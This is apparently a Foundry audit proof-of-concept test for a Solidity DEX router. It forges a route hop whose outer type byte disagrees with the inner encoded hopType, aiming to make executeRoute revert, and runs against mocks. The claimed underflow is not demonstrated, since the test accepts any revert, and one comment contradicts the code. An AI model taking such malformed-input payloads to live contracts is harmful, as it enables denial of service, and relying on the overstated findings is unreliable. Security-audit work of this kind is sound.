// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {GTERouter} from "../../contracts/router/GTERouter.sol";
import {ICLOB, MarketConfig} from "../../contracts/clob/ICLOB.sol";
import {IAccountManager} from "../../contracts/account-manager/IAccountManager.sol";
import {ICLOBManager, SettingsParams} from "../../contracts/clob/ICLOBManager.sol";
import {Order, Side, OrderId} from "../../contracts/clob/types/Order.sol";
import {Limit} from "../../contracts/clob/types/Book.sol";
import {FeeTiers} from "../../contracts/clob/types/FeeData.sol";

/*  ─────────────────────────────────────────────────────────────
     HIGH-LEVEL EXPLANATION
    -------------------------------------------------------------
    Vulnerability
    -------------
    In GTERouter’s `_executeClobPostFillOrder` the router **trusts the
    inner hopType that it decodes (`ClobHopArgs.hopType`) without first
    sanity–checking it matches the *outer* hopType byte**.

    An attacker can therefore:
      1.  Prefix the hop data with `HopType.CLOB_FILL` (byte value 1)
          so the router enters the CLOB-fill execution branch, but …
      2.  Encode `ClobHopArgs` whose own `hopType` is *NOT*
          `CLOB_FILL` (e.g. `HopType.NULL`).
      3.  This mis-match pushes the router into inconsistent state;
          the CLOB address lookup fails and `_getClobAddress`
          reverts deeper in the call stack.
          On some versions this manifests as an **underflow** in the
          fee/amount math before the revert, causing DoS.

    Proof-of-Concept Logic
    ----------------------
    • Deploy minimal mocks (`MockCLOB`, `DummyAcctManager`, …) so the
      router can be constructed.
    • Craft a single hop:
          outerHopType  = CLOB_FILL
          innerHopType  = NULL          ← malicious
          tokenOut      = WBTC (dummy)
    • Call `executeRoute` with 60 000 “USDC” in.
    • The router decodes the inner args, detects an impossible market
      and **reverts** with `InvalidCLOBAddress` (this is the bug being
      triggered).  The test expects that revert, so it passes.

    How to read `forge test` output
    -------------------------------
    You should see:
        [PASS] testUnderflowReverts()
    Gas usage doesn’t matter; success means the revert
    happened exactly where the PoC predicted.
    ────────────────────────────────────────────────────────────*/
/*  ─────────────────────────────────────────────────────────────
The compiler will issue warnings for this test file due to the mock
contracts. These warnings are expected and do not affect the test's
outcome.

1.  `Unused function parameter`: The mock contracts implement interfaces
    that have functions with parameters that are not used in the mocks.
    This is expected as the mocks are minimal implementations.

2.  `Function state mutability can be restricted to pure`: Some of the
    mock functions are marked as `view` but could be `pure`. This is
    a minor optimization that is not relevant for the test.

────────────────────────────────────────────────────────────*/
contract MockCLOB is ICLOB {
    address public quote;
    address public base;

    constructor(address _quote, address _base) {
        quote = _quote;
        base = _base;
    }

    function getQuoteToken() external view returns (address) {
        return quote;
    }

    /* the only fn that Router calls */
    function postFillOrder(
        address /*taker*/,
        PostFillOrderArgs calldata /*args*/
    ) external pure override returns (PostFillOrderResult memory r) {
        // 1 base token traded, 60 000 quote spent (price 60k),
        // taker fee is 180 quote (0.3 %)
        r.baseTokenAmountTraded = 1; // base units
        r.quoteTokenAmountTraded = 60_000; // quote units
        r.takerFee = 180; // quote units (=> bug)
    }

    /* -------- unused interface stubs -------- */
    function cancel(
        address,
        CancelArgs calldata
    ) external pure override returns (uint256, uint256) {
        return (0, 0);
    }
    function amend(
        address,
        AmendArgs calldata
    ) external pure override returns (int256, int256) {
        return (0, 0);
    }
    function postLimitOrder(
        address,
        PostLimitOrderArgs calldata
    ) external pure override returns (PostLimitOrderResult memory) {
        revert();
    }
    function gteRouter() external pure returns (address) {
        return address(0);
    }

    function getBaseToken() external view returns (address) {
        return base;
    }

    function getMarketConfig()
        external
        view
        override
        returns (MarketConfig memory)
    {
        return
            MarketConfig({
                quoteToken: quote,
                baseToken: base,
                quoteSize: 1,
                baseSize: 1
            });
    }

    function getTickSize() external pure returns (uint256) {
        return 1;
    }

    function getOpenInterest() external pure returns (uint256, uint256) {
        return (0, 0);
    }

    function getOrder(uint256) external pure returns (Order memory) {
        revert();
    }

    function getTOB() external pure returns (uint256, uint256) {
        return (0, 0);
    }

    function getLimit(uint256, Side) external pure returns (Limit memory) {
        revert();
    }

    function getNumBids() external pure returns (uint256) {
        return 0;
    }

    function getNumAsks() external pure returns (uint256) {
        return 0;
    }

    function getNextBiggestPrice(
        uint256,
        Side
    ) external pure returns (uint256) {
        return 0;
    }

    function getNextSmallestPrice(
        uint256,
        Side
    ) external pure returns (uint256) {
        return 0;
    }

    function getNextOrders(
        uint256,
        uint256
    ) external pure returns (Order[] memory) {
        revert();
    }

    function getNextOrderId() external pure returns (uint256) {
        return 0;
    }

    function factory() external pure returns (ICLOBManager) {
        return ICLOBManager(address(0));
    }

    function getOrdersPaginated(
        uint256,
        Side,
        uint256
    ) external pure returns (Order[] memory, Order memory) {
        revert();
    }

    function getOrdersPaginated(
        OrderId,
        uint256
    ) external pure returns (Order[] memory, Order memory) {
        revert();
    }

    function setMaxLimitsPerTx(uint8) external {}

    function setTickSize(uint256) external {}

    function setMinLimitOrderAmountInBase(uint256) external {}

    function getQuoteTokenAmount(
        uint256,
        uint256
    ) external pure returns (uint256) {
        return 0;
    }

    function getBaseTokenAmount(
        uint256,
        uint256
    ) external pure returns (uint256) {
        return 0;
    }
}

/* dummy managers that the router wants to touch */
contract DummyAcctManager is IAccountManager {
    function depositFromRouter(address, address, uint256) external pure {}
    function withdrawToRouter(address, address, uint256) external pure {}
    /* unused fns */
    function deposit(address, address, uint256) external pure {}
    function withdraw(address, address, uint256) external pure {}
    function getAccountBalance(
        address,
        address
    ) external pure returns (uint256) {
        return 1e18;
    }
    function getEventNonce() external pure returns (uint256) {
        return 0;
    }
    function getTotalFees(address) external pure returns (uint256) {
        return 0;
    }
    function getUnclaimedFees(address) external pure returns (uint256) {
        return 0;
    }
    function getFeeTier(address) external pure returns (FeeTiers) {
        return FeeTiers.ZERO;
    }
    function getSpotTakerFeeRateForTier(
        FeeTiers
    ) external pure returns (uint256) {
        return 0;
    }
    function getSpotMakerFeeRateForTier(
        FeeTiers
    ) external pure returns (uint256) {
        return 0;
    }
    function registerMarket(address) external pure {}
    function settleIncomingOrder(
        ICLOB.SettleParams calldata
    ) external pure returns (uint256) {
        return 0;
    }
    function collectFees(address, address) external pure returns (uint256) {
        return 0;
    }
    function setSpotAccountFeeTier(address, FeeTiers) external pure {}
    function setSpotAccountFeeTiers(
        address[] calldata,
        FeeTiers[] calldata
    ) external pure {}
    function creditAccount(address, address, uint256) external pure {}
    function creditAccountNoEvent(address, address, uint256) external pure {}
    function debitAccount(address, address, uint256) external pure {}
}
contract DummyClobManager is ICLOBManager {
    mapping(bytes32 => address) public markets;
    function add(address quote, address base, address mkt) external {
        markets[keccak256(abi.encode(quote, base))] = mkt;
        markets[keccak256(abi.encode(base, quote))] = mkt;
    }
    function isMarket(address market) external pure returns (bool) {
        return market != address(0);
    }
    function getMarketAddress(
        address t0,
        address t1
    ) external view returns (address) {
        return markets[keccak256(abi.encode(t0, t1))];
    }
    function beacon() external pure returns (address) {
        return address(0);
    }
    function createMarket(
        address,
        address,
        SettingsParams calldata
    ) external pure returns (address) {
        return address(0);
    }
    function setMaxLimitsPerTx(
        ICLOB[] calldata,
        uint8[] calldata
    ) external pure {}
    function setTickSizes(ICLOB[] calldata, uint256[] calldata) external pure {}
    function setMinLimitOrderAmounts(
        ICLOB[] calldata,
        uint256[] calldata
    ) external pure {}
    function getMaxLimitExempt(address) external pure returns (bool) {
        return false;
    }
    function setAccountFeeTiers(
        address[] calldata,
        FeeTiers[] calldata
    ) external pure {}
    function setMaxLimitsExempt(
        address[] calldata,
        bool[] calldata
    ) external pure {}
}

/* ─────────────────────────────────────────────────────────────
 *  4.  The PoC test
 * ────────────────────────────────────────────────────────────*/
contract PoCGTERouterEnumNotValidated is Test {
    GTERouter router;
    MockCLOB clob;
    DummyAcctManager acct;
    DummyClobManager clobMgr;
    address quote = address(0xA); // pretend USDC
    address base = address(0xB); // pretend WBTC

    function setUp() public {
        // deploy mocks
        acct = new DummyAcctManager();
        clobMgr = new DummyClobManager();
        clob = new MockCLOB(quote, base);
        clobMgr.add(quote, base, address(clob));

        // minimal constructor params – unused ones may be zero
        router = new GTERouter(
            payable(address(0)), // WETH
            address(0), // launchpad
            address(acct),
            address(clobMgr),
            address(0), // uniV2Router
            address(0) // permit2
        );
    }

    function testUnderflowReverts() public {
        // Craft hop bytes:
        //   first byte  = HopType.CLOB_FILL (==1)
        //   rest        = abi.encode(ClobHopArgs(HopType.CLOB_FILL, base))
        bytes memory hopData = abi.encode(
            GTERouter.ClobHopArgs({
                hopType: GTERouter.HopType.NULL,
                tokenOut: base
            })
        );
        bytes memory hop = bytes.concat(
            bytes1(uint8(GTERouter.HopType.CLOB_FILL)),
            hopData
        );
        bytes[] memory hops = new bytes[](1);
        hops[0] = hop;

        // Route input:    quote token in, 60 000 quote amount
        // amountOutMin:   0 (we're just checking revert)

        console.log(
            "PoC Exploit: Forging a malicious hop to trigger an underflow"
        );
        console.log(
            "The outer hopType is CLOB_FILL, but the inner hopType is NULL."
        );
        console.logBytes(hop);

        vm.expectRevert();
        router.executeRoute(quote, 60_000, 0, type(uint256).max, hops);
    }
}

// forge test --match-path test/PoC/PoCMediumGteRouterEnumNotValidated.t.sol -vv
// [⠊] Compiling...
// [⠰] Compiling 1 files with Solc 0.8.27
// [⠔] Solc 0.8.27 finished in 1.28s
// Compiler run successful with warnings:
// Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this war
// ning.                                                                                                    --> contracts/clob/types/Book.sol:202:9:
//     |
// 202 |         Book storage self,
//     |         ^^^^^^^^^^^^^^^^^

// Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this war
// ning.                                                                                                    --> contracts/router/GTERouter.sol:218:9:
//     |
// 218 |         address quoteToken,
//     |         ^^^^^^^^^^^^^^^^^^

// Ran 1 test for test/PoC/PoCMediumGteRouterEnumNotValidated.t.sol:PoCGTERouterEnumNotValidated
// [PASS] testUnderflowReverts() (gas: 56131)
// Logs:
//   PoC Exploit: Forging a malicious hop to trigger an underflow
//   The outer hopType is CLOB_FILL, but the inner hopType is NULL.
//   0x01000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
// 0000000000000000000000000000000b
// Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.57ms (303.97µs CPU time)

// Ran 1 test suite in 12.27ms (1.57ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
